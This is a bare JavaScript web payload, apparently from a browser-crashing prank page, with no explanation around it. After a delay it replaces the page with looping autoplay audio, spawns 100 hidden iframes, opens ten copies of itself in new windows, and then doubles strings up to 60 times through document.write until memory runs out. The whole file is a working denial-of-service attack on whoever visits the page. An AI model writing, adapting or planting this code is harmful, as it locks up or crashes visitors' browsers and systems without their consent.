html = '<audio src="sound.ogg" autoplay loop volume="1.0"></audio><div></div><style>div{display:block;}body{background-image:url("happy.gif");}</style><BGSOUND SRC="sound.ogg" LOOP=INFINITE>';

function k(){
    var longunistring1 = unescape("%u4141%u4141");
    var longunistring2 = unescape("%u4242%u4242");
    var longunistring3 = unescape("%u4343%u4343");
    var longunistring4 = unescape("%u4444%u4444");
    for(i=0; i <= 60 ; ++i) 
    {
        longunistring1+=longunistring1;
        longunistring2+=longunistring2;
        longunistring3+=longunistring3;
        longunistring4+=longunistring4;
        document.write(longunistring1);
        document.write(longunistring2);
        document.write(longunistring3);
        document.write(longunistring4);
    }    
    document.write(longunistring1);
    document.write(longunistring2);
    document.write(longunistring3);
    document.write(longunistring4);
}
function b(){
    for (var counter = 0; counter < 100; counter++)
    {
        var iframe = document.createElement('iframe');
        iframe.name = 'iname'+(Math.floor(Math.random() * (99999)) );
        iframe.src = 'handler.html#'+(Math.floor(Math.random() * (9999999)) );
        iframe.style.width = '10px';
        iframe.style.height = '10px';
        iframe.style.position='absolute';
        iframe.style.left='-100px';
        document.body.appendChild(iframe);
    };
    for (x = 0; x < 10; x++) {
        window.open(document.baseURI);
    }
    setTimeout(function(){ k(); }, 2000);
    return true;
}

function Load(){
    setTimeout(function(){ 
        document.body.innerHTML = html;
        setTimeout(function(){ b(); }, 100);
    }, 2000);    
}
